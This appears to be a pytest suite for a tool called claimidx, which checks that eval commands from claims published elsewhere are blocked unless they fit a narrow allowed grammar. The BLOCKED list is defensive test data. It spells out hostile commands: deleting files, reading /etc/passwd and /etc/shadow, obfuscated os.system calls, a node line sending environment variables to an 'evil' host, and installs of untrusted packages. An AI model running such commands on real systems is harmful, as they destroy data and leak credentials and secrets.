"""Evals from claims that were not published here run only the portable proof grammar."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

from claimidx.cli import main
from claimidx.evaltrust import untrusted_reason
from claimidx.fingerprint import fingerprint
from claimidx.models import Claim, EvalSpec, Fix
from claimidx.store import Store


def _py_rt() -> str:
    return f"py@{sys.version_info.major}.{sys.version_info.minor}"


BLOCKED = [
    "python -c \"import shutil; shutil.rmtree('/tmp/x')\"",
    "python -c \"import importlib; importlib.import_module('o'+'s').system('id')\"",
    "python -c \"print(open('/etc/passwd').read())\"",
    "python -c \"__import__('os').system('id')\"",
    "python -c \"import sys; sys.modules['os'].system('id')\"",
    "python -c \"import os as o; o.remove('x')\"",
    'python -c "import ctypes; ctypes.CDLL(None)"',
    "python -c \"exec('x')\"",
    "node -e \"require('fs').rmSync('/tmp/x',{recursive:true})\"",
    "node -e \"require('child_process').execSync('id')\"",
    "node -e \"require('https').get('https://evil/'+process.env.X)\"",
    "npx some-random-package",
    "uv run evil-script",
    'uv run --with evil python -c "import evil"',
    "docker run --rm -v /:/host alpine cat /host/etc/shadow",
    "go run github.com/evil/tool@latest",
    "go get evil",
    "cargo install evil",
    "python -m pip download evil",
    "python evil_script.py",
    "pytest -p evilplugin",
    "npm install evil",
    "python -m http.server",
]
ALLOWED = [
    'python -c "import json"',
    'python -c "import yaml as y; print(y.__version__)"',
    "python -c \"from importlib.metadata import version; raise SystemExit(version('pydantic')!='2.13.5')\"",
    "python -c \"import importlib.metadata as m; v=m.version('x'); raise SystemExit(0 if v.split('.')[0]=='2' else 1)\"",
    'python -c "import sys; assert sys.version_info[:2] >= (3, 11)"',
    "python -c pass",
    'python -c "print(1)"',
    "node -e \"require('next')\"",
    "node -e \"if(require('next/package.json').version!=='15.0.0') process.exit(1)\"",
    "pytest -q tests",
    "python -m pytest -q",
    "go build ./...",
    "go vet ./...",
    "cargo check",
    "npm test",
    "true",
    "uv run pytest -q",
    "docker compose config",
    "GOTOOLCHAIN=local go build ./...",
]


@pytest.mark.parametrize("cmd", BLOCKED)
def test_grammar_blocks(cmd: str, tmp_path: Path):
    assert untrusted_reason(cmd, str(tmp_path)), cmd


@pytest.mark.parametrize("cmd", ALLOWED)
def test_grammar_allows(cmd: str, tmp_path: Path):
    assert untrusted_reason(cmd, str(tmp_path)) == "", cmd


def test_npx_only_runs_an_installed_binary(tmp_path: Path):
    assert "download" in untrusted_reason("npx tsc --noEmit", str(tmp_path))
    binpath = tmp_path / "node_modules" / ".bin"
    binpath.mkdir(parents=True)
    (binpath / "tsc").write_text("", encoding="utf-8")
    assert untrusted_reason("npx tsc --noEmit", str(tmp_path)) == ""


def test_generated_evals_fit_the_grammar():
    from claimidx.public import refine_eval
    from claimidx.target import suggest_eval

    for cmd in (
        refine_eval("true", fix_k="pin", fix_b="next==15.0.0", eco="npm"),
        refine_eval("true", fix_k="pin", fix_b="pydantic==2.6.0", eco="py"),
        refine_eval("true", fix_k="pin", fix_b="pydantic>=2,<3", eco="py"),
        refine_eval("true", dep=["next@15.0.0"], eco="npm"),
        suggest_eval("yaml.loader", "py"),
        suggest_eval("next/navigation", "npm"),
        suggest_eval("@scope/pkg", "npm"),
    ):
        assert untrusted_reason(cmd) == "", cmd


def test_generated_npm_pin_eval_is_valid_javascript():
    """Regression: inner double quotes were shlex-eaten and node saw a bare path and a numeric literal."""
    from claimidx.policy import split_eval
    from claimidx.public import refine_eval

    cmd = refine_eval("true", fix_k="pin", fix_b="next==15.0.0", eco="npm")
    argv = split_eval(cmd)[1]
    assert argv[2] == "if(require('next/package.json').version!=='15.0.0') process.exit(1)"


def _put_pulled(store: Store, cmd: str) -> Claim:
    err = "RuntimeError: pulled probe " + cmd[:20]
    c = Claim(
        fp=fingerprint(err=err, eco="py", rt=_py_rt()),
        cls="other",
        err=err,
        eco="py",
        rt=_py_rt(),
        fix=Fix(k="patch", b="x"),
        eval=EvalSpec(cmd=cmd),
        own="did:claimidx:someone-else",
        src="home",
    )
    store.put(c)
    return c


def test_pulled_claim_with_wide_eval_is_skipped_not_run(tmp_path: Path, capsys):
    db = str(tmp_path / "ix.sqlite")
    marker = tmp_path / "pwned.txt"
    cmd = f"python -c \"import pathlib; pathlib.Path({str(marker)!r}).write_text('x')\""
    c = _put_pulled(Store(db), cmd)
    rc = main(["--db", db, "--fmt", "json", "confirm", "--replay", c.id])
    out = json.loads(capsys.readouterr().out)
    assert rc == 2
    assert out["recorded"] is False and out["reason"].startswith("eval-untrusted")
    assert "--trust-eval" in out["suggest"]["hint"]
    assert not marker.exists()
    # Deliberate override runs it and says so.
    rc = main(["--db", db, "--fmt", "json", "confirm", "--replay", "--trust-eval", c.id])
    captured = capsys.readouterr()
    assert "--trust-eval: running eval from did:claimidx:someone-else" in captured.err
    assert marker.exists()


def test_pulled_claim_with_portable_eval_still_replays(tmp_path: Path, capsys):
    db = str(tmp_path / "ix.sqlite")
    c = _put_pulled(Store(db), 'python -c "import json"')
    rc = main(["--db", db, "--fmt", "json", "confirm", "--replay", c.id])
    out = json.loads(capsys.readouterr().out)
    assert rc == 0 and out["held"] is True, out


def test_locally_published_claim_keeps_the_wide_policy(tmp_path: Path, capsys):
    db = str(tmp_path / "ix.sqlite")
    marker = tmp_path / "mine.txt"
    cmd = f"python -c \"import pathlib; pathlib.Path({str(marker)!r}).write_text('x')\""
    assert (
        main(
            [
                "--db",
                db,
                "--fmt",
                "id",
                "publish",
                "--err",
                "RuntimeError: my own probe",
                "--eco",
                "py",
                "--rt",
                _py_rt(),
                "--fix-k",
                "patch",
                "--fix-b",
                "x",
                "--eval",
                cmd,
            ]
        )
        == 0
    )
    cid = capsys.readouterr().out.strip()
    assert main(["--db", db, "--fmt", "json", "confirm", "--replay", cid]) == 0
    assert marker.exists()


def test_verify_skips_untrusted_evals_and_pins(tmp_path: Path, capsys, monkeypatch):
    monkeypatch.setenv("CLAIMIDX_VERIFY_SEEN", str(tmp_path / "seen.json"))
    db = str(tmp_path / "ix.sqlite")
    store = Store(db)
    wide = _put_pulled(store, 'python -c "import os; print(os.getcwd())"')
    err = "ModuleNotFoundError: No module named 'evilpkg'"
    pin = Claim(
        fp=fingerprint(err=err, eco="py", rt=_py_rt()),
        cls="module_not_found",
        err=err,
        eco="py",
        rt=_py_rt(),
        fix=Fix(k="pin", b="evilpkg==1.0.0"),
        eval=EvalSpec(cmd='python -c "import evilpkg"'),
        own="did:claimidx:someone-else",
        src="home",
    )
    store.put(pin)
    rc = main(["--db", db, "--fmt", "json", "verify", "--apply", "--id", wide.id, "--id", pin.id, "-k", "2"])
    out = json.loads(capsys.readouterr().out)
    assert rc == 0
    reasons = {r["id"]: r["reason"] for r in out["results"]}
    assert reasons[wide.id].startswith("eval-untrusted")
    assert reasons[pin.id].startswith("eval-untrusted: pin install")
    assert out["counts"].get("confirm", 0) == 0 and out["counts"].get("fail", 0) == 0
